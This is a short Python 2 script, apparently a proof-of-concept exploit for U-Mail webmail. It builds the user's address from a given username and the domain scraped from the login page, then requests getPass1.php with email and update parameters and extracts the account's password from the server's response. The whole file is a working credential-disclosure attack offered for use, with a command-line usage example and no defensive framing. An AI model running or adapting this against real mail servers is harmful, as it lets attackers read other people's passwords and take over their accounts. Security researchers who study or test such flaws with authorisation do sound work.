#coding=utf-8
import urllib2,urllib
import sys
import re
'''
eg:  u-mail.py http://mail.xx.com/webmail username
'''
req=urllib2.Request(sys.argv[1])
try:
    fd=urllib2.urlopen(req,timeout=5)      
except urllib2.URLError,e:
    print e
    sys.exit(1) 
#判读读取   
read_f=fd.read()   
#url判断
# print "geturl:",fd.geturl()
url=sys.argv[1]+'/getPass1.php'
# print "poc_url",url
email_hou=','.join(re.findall(r'(@[a-zA-Z0-9]*[_]*.[a-zA-Z]*)',read_f))
#poc函数          
def addgetdata(url,data):
    return url+'?'+urllib.urlencode(data)
email_qian=sys.argv[2]
email=email_qian+email_hou
# print email
url_poc=addgetdata(url,[('email',email),('update','s')])
print "PURL:" ,url_poc
req_s=urllib2.Request(url_poc)
try:  
    fd_s=urllib2.urlopen(req_s,timeout=5)
except urllib2.URLError,e:
    print e
    sys.exit(2)   
read_file=fd_s.read()
#查找password
if '<font color=red>'in read_file:
    password=re.search("<font color=red>.*</font>",read_file)    
    print '\033[1; ;31m','Email:',email,'\033[0m'
    print '\033[1; ;31m','Password:',password.group(),'\033[0m'
else:
    print "Not Found!Try again another username!"




    

